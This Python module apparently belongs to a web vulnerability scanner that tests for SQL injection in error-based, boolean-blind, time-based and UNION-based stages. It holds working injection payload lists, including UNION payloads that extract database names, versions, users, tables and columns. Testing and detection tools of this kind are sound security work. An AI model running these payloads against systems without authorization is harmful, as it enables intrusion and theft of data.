#!/usr/bin/env python3
"""
SQL Injection Verifier
======================
Multi-stage verification with data extraction:

  Stage 1: Error-based detection (10+ DBMS signatures)
  Stage 2: Boolean-based blind (differential analysis)
  Stage 3: Time-based blind (statistical timing)
  Stage 4: UNION-based extraction (DB name, version, user, tables)
  Stage 5: Final confirmation with independent payloads
"""
import re
import time
import random
from typing import Optional, Dict, List, Tuple

from ..base_verifier import BaseVerifier
from ..models import VerifiedFinding, VerificationStep, VerificationEvidence


class SQLiVerifier(BaseVerifier):
    VULN_TYPE = "SQLi"
    VULN_TITLE = "SQL Injection"
    DEFAULT_SEVERITY = "high"
    DEFAULT_CWE = "CWE-89"
    DEFAULT_CVSS = 8.1
    DEFAULT_CVSS_VECTOR = "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
    DEFAULT_REMEDIATION = (
        "Use parameterized queries (prepared statements) for all "
        "database access. Never concatenate user input into SQL strings. "
        "Apply input validation and least-privilege DB accounts."
    )

    # ═══════════════════════════════════════════════════════════════════════
    #  DBMS error patterns
    # ═══════════════════════════════════════════════════════════════════════

    ERROR_PATTERNS = {
        "MySQL": [
            (r"SQL syntax.*?MySQL", "MySQL syntax error"),
            (r"Warning.*?\bmysql_", "PHP MySQL warning"),
            (r"MySQLSyntaxErrorException", "MySQL exception"),
            (r"valid MySQL result", "MySQL result error"),
            (r"You have an error in your SQL syntax", "MySQL syntax error"),
            (r"mysql_fetch_array\(\)", "MySQL fetch error"),
            (r"mysql_num_rows\(\)", "MySQL num_rows error"),
            (r"supplied argument is not a valid MySQL", "MySQL argument error"),
            (r"check the manual that corresponds to your (MySQL|MariaDB) server",
             "MySQL manual reference"),
        ],
        "PostgreSQL": [
            (r"PostgreSQL.*?ERROR", "PostgreSQL error"),
            (r"Warning.*?\Wpg_", "PHP pg warning"),
            (r"valid PostgreSQL result", "PostgreSQL result error"),
            (r"pg_query\(\)", "PostgreSQL query error"),
            (r"pg_exec\(\)", "PostgreSQL exec error"),
            (r"unterminated quoted string at or near", "PostgreSQL unterminated"),
            (r"ERROR:\s+syntax error at or near", "PostgreSQL syntax error"),
            (r"psql:", "psql error"),
        ],
        "MSSQL": [
            (r"Driver.*?SQL[\-\_\ ]*Server", "MSSQL driver error"),
            (r"OLE DB.*?SQL Server", "MSSQL OLE DB"),
            (r"SQLServer JDBC Driver", "MSSQL JDBC driver"),
            (r"mssql_query\(\)", "MSSQL query error"),
            (r"ODBC SQL Server Driver", "MSSQL ODBC"),
            (r"Unclosed quotation mark after the character string",
             "MSSQL unclosed string"),
            (r"System\.Data\.SqlClient\.SqlException", "MSSQL .NET exception"),
            (r"Microsoft OLE DB Provider for SQL Server", "MSSQL OLE DB Provider"),
            (r"Incorrect syntax near", "MSSQL syntax error"),
        ],
        "Oracle": [
            (r"ORA-\d{5}", "Oracle error"),
            (r"Oracle.*?Driver", "Oracle driver"),
            (r"Warning.*?\boci_", "PHP Oracle warning"),
            (r"quoted string not properly terminated", "Oracle string error"),
            (r"oracle\.jdbc", "Oracle JDBC"),
        ],
        "SQLite": [
            (r"SQLite/JDBCDriver", "SQLite JDBC"),
            (r"SQLite\.Exception", "SQLite exception"),
            (r"System\.Data\.SQLite\.SQLiteException", "SQLite .NET"),
            (r"\[SQLITE_ERROR\]", "SQLite error"),
            (r"sqlite_", "SQLite internal"),
        ],
    }

    # ═══════════════════════════════════════════════════════════════════════
    #  Payloads
    # ═══════════════════════════════════════════════════════════════════════

    ERROR_PAYLOADS = [
        "'", '"', "')", '")', "';", '";',
        "1'", '1"', "1'-- -", "1'#",
        "' OR '1'='1", "' AND '1'='2",
        "1' AND 1=1-- -", "1' AND 1=2-- -",
        "1' ORDER BY 1-- -", "1' ORDER BY 100-- -",
        "1' UNION SELECT NULL-- -",
        "1' UNION SELECT NULL,NULL-- -",
    ]

    BOOLEAN_TRUE = [
        "1' AND '1'='1",
        "1 AND 1=1",
        "1') AND ('1'='1",
        '1" AND "1"="1',
        "1 AND 2>1",
        "1' AND 'a'='a",
    ]

    BOOLEAN_FALSE = [
        "1' AND '1'='2",
        "1 AND 1=2",
        "1') AND ('1'='2",
        '1" AND "1"="2',
        "1 AND 2<1",
        "1' AND 'a'='b",
    ]

    TIME_PAYLOADS = {
        "MySQL": [
            ("' AND SLEEP({d})-- -", 5),
            ("' OR SLEEP({d})#", 5),
            ("1' AND SLEEP({d}) AND '1'='1", 5),
            ("' AND (SELECT {d} FROM (SELECT SLEEP({d}))x)-- -", 5),
        ],
        "PostgreSQL": [
            ("'; SELECT pg_sleep({d})-- -", 5),
            ("' OR pg_sleep({d})-- -", 5),
            ("1' AND pg_sleep({d})-- -", 5),
        ],
        "MSSQL": [
            ("'; WAITFOR DELAY '0:0:{d}'-- -", 5),
            ("' OR 1=1; WAITFOR DELAY '0:0:{d}'-- -", 5),
            ("1'; WAITFOR DELAY '0:0:{d}'-- -", 5),
        ],
        "Oracle": [
            ("' AND 1=dbms_pipe.receive_message(('a'),{d})-- -", 5),
            ("' OR 1=dbms_pipe.receive_message(('a'),{d})-- -", 5),
        ],
    }

    EXTRACTION_PAYLOADS = {
        "MySQL": [
            ("' UNION SELECT database(),version(),user(),NULL,NULL-- -",
             ["database", "version", "user"]),
            ("' UNION SELECT database(),NULL-- -", ["database"]),
            ("' UNION SELECT version(),NULL-- -", ["version"]),
            ("' UNION SELECT user(),NULL-- -", ["user"]),
            ("' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -",
             ["tables"]),
            ("' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'-- -",
             ["columns"]),
            ("' AND extractvalue(1,concat(0x7e,database()))-- -", ["database"]),
            ("' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -", ["database"]),
        ],
        "PostgreSQL": [
            ("' UNION SELECT current_database(),version(),current_user,NULL,NULL-- -",
             ["database", "version", "user"]),
            ("' UNION SELECT current_database(),NULL-- -", ["database"]),
            ("' UNION SELECT version(),NULL-- -", ["version"]),
            ("' UNION SELECT current_user,NULL-- -", ["user"]),
        ],
        "MSSQL": [
            ("' UNION SELECT DB_NAME(),@@version,SUSER_NAME(),NULL,NULL-- -",
             ["database", "version", "user"]),
            ("' UNION SELECT DB_NAME(),NULL-- -", ["database"]),
            ("' UNION SELECT @@version,NULL-- -", ["version"]),
            ("' UNION SELECT SUSER_NAME(),NULL-- -", ["user"]),
            ("' UNION SELECT name,NULL FROM sys.databases-- -", ["databases"]),
        ],
    }

    DB_SIGNATURES = {
        "database": [
            r"\b(information_schema|mysql|postgres|master|tempdb|model|msdb|sqlite_master)\b",
            r"\b([a-z][a-z0-9_]{2,30})\b",
        ],
        "version": [
            r"\d+\.\d+\.\d+(?:-\w+)?",
            r"MySQL \d+\.\d+", r"PostgreSQL \d+",
            r"Microsoft SQL Server \d+", r"MariaDB",
        ],
        "user": [
            r"root@\w+", r"postgres@\w+", r"sa@\w+",
            r"www-data@\w+", r"mysql@\w+",
        ],
    }

    # ═══════════════════════════════════════════════════════════════════════
    #  Main verify
    # ═══════════════════════════════════════════════════════════════════════

    def verify(self, url, param, method="GET", form_data=None):
        self.steps = []
        detected_dbms = None
        confidence = 0.0
        key_exchange = None
        extracted = {}

        # ── Stage 1: Error-based ─────────────────────────────────────────
        error_step = self.start_step(
            "error_based_detection",
            "Testing for DBMS-specific error messages",
            stage="detection",
        )
        dbms_errors, error_exchange = self._test_error_based(
            url, param, method, form_data
        )
        if dbms_errors:
            detected_dbms = list(dbms_errors.keys())[0]
            match_text, payload_used = dbms_errors[detected_dbms]
            ev = VerificationEvidence(
                type="dbms_error",
                title=f"{detected_dbms} error message revealed",
                description=(
                    f"Injecting the payload triggered a {detected_dbms} "
                    f"error message, confirming the input is concatenated "
                    f"into an SQL query."
                ),
                payload=payload_used,
                raw_match=match_text,
                exchange=error_exchange,
                confidence=0.9,
                extracted_data={"dbms": detected_dbms},
            )
            self.finish_step(
                error_step, "passed",
                payload=payload_used,
                details=f"DBMS detected: {detected_dbms}",
                evidence=[ev],
            )
            confidence = 0.9
            key_exchange = error_exchange
        else:
            self.finish_step(error_step, "failed",
                            details="No DBMS error messages detected")

        # ── Stage 2: Boolean-based ───────────────────────────────────────
        bool_step = self.start_step(
            "boolean_based_blind",
            "Comparing TRUE vs FALSE condition responses",
            stage="detection",
        )
        bool_result = self._test_boolean_based(url, param, method, form_data)
        if bool_result:
            ev = VerificationEvidence(
                type="boolean_differential",
                title="Boolean-based blind SQLi confirmed",
                description=(
                    f"TRUE conditions matched baseline "
                    f"({bool_result['true_similarity']:.0%} similarity) "
                    f"while FALSE conditions differed significantly "
                    f"({bool_result['false_similarity']:.0%})."
                ),
                payload=bool_result['best_payload'],
                extracted_data={
                    "true_similarity": round(bool_result['true_similarity'], 3),
                    "false_similarity": round(bool_result['false_similarity'], 3),
                    "length_diff": bool_result['length_diff'],
                },
                exchange=bool_result['exchange'],
                confidence=0.85,
            )
            self.finish_step(
                bool_step, "passed",
                payload=bool_result['best_payload'],
                details=bool_result['summary'],
                evidence=[ev],
            )
            confidence = max(confidence, 0.85)
            if not key_exchange:
                key_exchange = bool_result['exchange']
        else:
            self.finish_step(bool_step, "failed",
                            details="No boolean differential detected")

        # ── Stage 3: Time-based ──────────────────────────────────────────
        if not detected_dbms or confidence < 0.9:
            time_step = self.start_step(
                "time_based_blind",
                "Measuring response time with sleep payloads",
                stage="detection",
            )
            time_result = self._test_time_based(
                url, param, detected_dbms, method, form_data
            )
            if time_result:
                detected_dbms = time_result['dbms']
                ev = VerificationEvidence(
                    type="timing_delay",
                    title=f"Time-based blind SQLi ({detected_dbms})",
                    description=(
                        f"Response time: {time_result['elapsed_ms']:.0f}ms "
                        f"(baseline: {time_result['baseline_ms']:.0f}ms, "
                        f"expected delay: {time_result['expected_delay']}s)."
                    ),
                    payload=time_result['payload'],
                    extracted_data={
                        "baseline_ms": round(time_result['baseline_ms'], 2),
                        "elapsed_ms": round(time_result['elapsed_ms'], 2),
                        "delay_seconds": time_result['expected_delay'],
                        "dbms": detected_dbms,
                    },
                    exchange=time_result['exchange'],
                    confidence=0.8,
                )
                self.finish_step(
                    time_step, "passed",
                    payload=time_result['payload'],
                    details=time_result['summary'],
                    evidence=[ev],
                )
                confidence = max(confidence, 0.8)
                if not key_exchange:
                    key_exchange = time_result['exchange']
            else:
                self.finish_step(time_step, "failed",
                                details="No timing delay detected")

        # ── Stage 4: Data extraction ─────────────────────────────────────
        if confidence >= 0.75:
            extract_step = self.start_step(
                "data_extraction",
                "Attempting to extract database information",
                stage="extraction",
            )
            extracted, extract_evidence = self._extract_data(
                url, param, detected_dbms, method, form_data
            )
            if extracted:
                ev = VerificationEvidence(
                    type="data_extracted",
                    title="Database information extracted",
                    description=(
                        f"Successfully extracted: "
                        f"{', '.join(extracted.keys())}"
                    ),
                    payload=extract_evidence.get('payload', ''),
                    extracted_data=extracted,
                    exchange=extract_evidence.get('exchange'),
                    confidence=0.98,
                )
                self.finish_step(
                    extract_step, "passed",
                    payload=extract_evidence.get('payload', ''),
                    details=f"Extracted: {extracted}",
                    evidence=[ev],
                )
                confidence = min(1.0, confidence + 0.1)
                if extract_evidence.get('exchange') and not key_exchange:
                    key_exchange = extract_evidence['exchange']
            else:
                self.finish_step(
                    extract_step, "failed",
                    details="Could not extract data (may need manual exploitation)",
                )

        # ── Final decision ───────────────────────────────────────────────
        if confidence >= 0.75:
            methods = [s.name for s in self.steps if s.status == "passed"]
            desc_parts = [
                f"SQL Injection verified using {len(methods)} method(s).",
            ]
            if detected_dbms:
                desc_parts.append(f"DBMS: {detected_dbms}.")
            if extracted:
                desc_parts.append(f"Extracted data: {extracted}.")

            return self.build_finding(
                url=url, param=param,
                confidence=confidence,
                description=" ".join(desc_parts),
                methods=methods,
                extracted_info=extracted,
                key_exchange=key_exchange,
            )
        return None

    # ═══════════════════════════════════════════════════════════════════════
    #  Stage 1: Error-based
    # ═══════════════════════════════════════════════════════════════════════

    def _test_error_based(self, url, param, method, form_data):
        """Returns (dict {dbms: (match, payload)}, exchange)."""
        for payload in self.ERROR_PAYLOADS:
            ex = self.inject(url, param, payload, method, form_data)
            if not ex or ex.response_status == 0:
                continue
            body = ex.response_body or ""
            for dbms, patterns in self.ERROR_PATTERNS.items():
                for pattern, desc in patterns:
                    m = re.search(pattern, body, re.I | re.S)
                    if m:
                        return {dbms: (m.group(0)[:300], payload)}, ex
        return {}, None

    # ═══════════════════════════════════════════════════════════════════════
    #  Stage 2: Boolean-based
    # ═══════════════════════════════════════════════════════════════════════

    def _test_boolean_based(self, url, param, method, form_data):
        baseline = self.http.capture_baseline(url, param, method, form_data)
        if not baseline:
            return None

        true_results = []
        for payload in self.BOOLEAN_TRUE[:3]:
            ex = self.inject(url, param, payload, method, form_data)
            if ex and ex.response_status:
                true_results.append((payload, ex))

        false_results = []
        for payload in self.BOOLEAN_FALSE[:3]:
            ex = self.inject(url, param, payload, method, form_data)
            if ex and ex.response_status:
                false_results.append((payload, ex))

        if not true_results or not false_results:
            return None

        true_sims = [self.http.similarity(baseline[0], ex)
                    for _, ex in true_results]
        false_sims = [self.http.similarity(baseline[0], ex)
                     for _, ex in false_results]

        avg_true = sum(true_sims) / len(true_sims)
        avg_false = sum(false_sims) / len(false_sims)

        # Boolean SQLi: TRUE ~= baseline, FALSE != baseline
        if avg_true > 0.85 and avg_false < 0.7:
            best_idx = min(range(len(false_results)),
                          key=lambda i: false_sims[i])
            best_payload, best_ex = false_results[best_idx]
            length_diff = abs(len(baseline[0].response_body or "") -
                            len(best_ex.response_body or ""))

            return {
                "true_similarity": avg_true,
                "false_similarity": avg_false,
                "length_diff": length_diff,
                "best_payload": best_payload,
                "exchange": best_ex,
                "summary": (
                    f"TRUE conditions matched baseline ({avg_true:.0%}), "
                    f"FALSE differed ({avg_false:.0%}). "
                    f"Length diff: {length_diff} bytes."
                ),
            }
        return None

    # ═══════════════════════════════════════════════════════════════════════
    #  Stage 3: Time-based
    # ═══════════════════════════════════════════════════════════════════════

    def _test_time_based(self, url, param, dbms_hint, method, form_data):
        baseline_times = []
        for _ in range(3):
            ex = self.inject(url, param, "1", method, form_data)
            if ex:
                baseline_times.append(ex.response_time_ms)
        if not baseline_times:
            return None

        avg_baseline = sum(baseline_times) / len(baseline_times)
        threshold = max(baseline_times) + 3000

        dbms_list = ([dbms_hint] if dbms_hint
                    else list(self.TIME_PAYLOADS.keys()))

        for dbms in dbms_list:
            for template, expected_delay in self.TIME_PAYLOADS.get(dbms, []):
                payload = template.replace("{d}", str(expected_delay))
                ex = self.inject(url, param, payload, method, form_data)
                if not ex or ex.response_status == 0:
                    continue
                elapsed = ex.response_time_ms
                if (elapsed > threshold and
                    elapsed > expected_delay * 1000 * 0.7):
                    return {
                        "dbms": dbms,
                        "payload": payload,
                        "baseline_ms": avg_baseline,
                        "elapsed_ms": elapsed,
                        "expected_delay": expected_delay,
                        "exchange": ex,
                        "summary": (
                            f"Delay: {elapsed:.0f}ms vs baseline "
                            f"{avg_baseline:.0f}ms ({dbms})"
                        ),
                    }
        return None

    # ═══════════════════════════════════════════════════════════════════════
    #  Stage 4: Extraction
    # ═══════════════════════════════════════════════════════════════════════

    def _extract_data(self, url, param, dbms, method, form_data):
        if not dbms or dbms not in self.EXTRACTION_PAYLOADS:
            return {}, {}

        extracted = {}
        best_exchange = None
        last_payload = ""

        for payload, fields in self.EXTRACTION_PAYLOADS[dbms]:
            ex = self.inject(url, param, payload, method, form_data)
            if not ex or ex.response_status == 0:
                continue
            body = ex.response_body or ""

            for field in fields:
                patterns = self.DB_SIGNATURES.get(field, [])
                for pattern in patterns:
                    for m in re.finditer(pattern, body, re.I):
                        val = m.group(0)[:200]
                        if field not in extracted:
                            # Skip generic noise
                            if field == "database" and val.lower() in (
                                    "select", "from", "where", "table",
                                    "union", "null", "database", "and", "or"):
                                continue
                            extracted[field] = val
                            best_exchange = ex
                            last_payload = payload
                            break
                    if field in extracted:
                        break

        return extracted, {
            "exchange": best_exchange,
            "payload": last_payload,
        }